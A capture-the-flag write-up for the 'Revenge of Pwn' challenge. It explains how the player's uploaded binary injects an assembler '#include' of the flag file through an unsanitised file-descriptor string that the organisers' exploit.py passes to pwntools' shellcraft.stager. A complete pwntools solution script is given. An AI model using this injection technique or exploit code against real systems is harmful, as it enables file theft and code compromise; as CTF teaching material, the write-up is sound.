# Revenge of Pwn
_Category: misc, pwn_

## Description
> Have you ever thought those challenges you pwned may retaliate someday?
> `nc 3.115.58.219 9427`
> [revenge_of_pwn-255196bb99d75512732a4109f154103b4bc428e6e29e2cdcc69e44aee67ea75f.tar.gz](revenge_of_pwn-255196bb99d75512732a4109f154103b4bc428e6e29e2cdcc69e44aee67ea75f.tar.gz)

## README.md (from the challenge files)

`exploit.py` is able to exploit `chal/vuln`.

```
exploit.py --- pwn --->   chal/vuln
                       127.0.0.1:1337
```

Now you have the chance to *replace* the binary listening on 1337 port,
and you need to pwn the script who is pwning your binary!

```
exploit.py --- (will try to) pwn --->  <your uploaded file>
    ^                                     127.0.0.1:1337
    |
    |
you need to pwn this
```

The flag is located at `/home/deploy/flag`, which is readable by `exploit.py`.

## Solution

We need to coax `exploit.py` into giving us a copy of the flag, which it can read. To get started, we need to understand the `exploit.py` script itself.
Looking through the source, there are only a few places where we get a chance to specify user input. They are as follows:
```py
stk = int(r.recvline(), 16)
log.info('stk @ ' + hex(stk))
# some time later
shellcraft.read('rbp', stk + 48, 100) +
shellcraft.mov('rax', stk + 48) + 'jmp rax'
r.send(b'@' * 40 + p64(stk+48) + stage1)
```
This cannot be used in any meaningful way for us because it is cast to an integer before being used in shellcode. Even if we do supply a "malicious" value, it will only result in our program being sent bogus shellcode. Another option is as follows:
```py
d = str(s.recvuntil('@')[:-1], 'ascii')
log.info('sock fd @ ' + fd)
stage2 = asm(shellcraft.stager(fd, 0x4000))
```
This works much better for us, because we have an unlimited length string that is placed directly into the shellcode before it is assembled. It is not obvious from the function, but `shellcraft.stager` will simply concatinate the value for `fd` into assembly.

Now all we need to do is find something we can put in the assembly that when assembled, will let us see the flag. The simpliest option here is just to `#include flag.txt`, though there are some other options that result in the flag being sent back to our program we upload instead.

The final hurdle is the size limit on the ELF we upload:
```
ELF size? (MAX: 6144)
9999
¯\_(ツ)_/¯
```

The easiest option here is to just use shellcraft to generate a very small ELF with the payload we require.

Putting it all together, we end up with:
```py
from pwn import *
context.arch = 'amd64'

stk = "stack address @ 0x1\n"
evil_str = "1\n#include \"/home/deploy/flag\"@"

elf = make_elf(
    asm(
        shellcraft.pushstr(stk) +
        shellcraft.write(1, 'rsp', len(stk)) +
        """
        MOV    rcx, 5000000000
L1:
DEC    rcx
JNZ    L1
        """ +
        shellcraft.amd64.connect('127.0.0.1', 31337) +
        shellcraft.pushstr(evil_str) +
        shellcraft.write('rbp', 'rsp', len(evil_str)) +
        shellcraft.read('rbp', 'rsp', 10000) +
        shellcraft.write('rbp', 'rsp', 10000)
    )
)

io=remote("3.115.58.219", 9427)

io.recvuntil('ELF size? (MAX: 6144)')
io.sendline(str(len(elf)))
io.send(elf)
io.stream()
```

The only extra code in there is a busy loop, which helps make sure we don't try to connect to the stage2 handler too early.
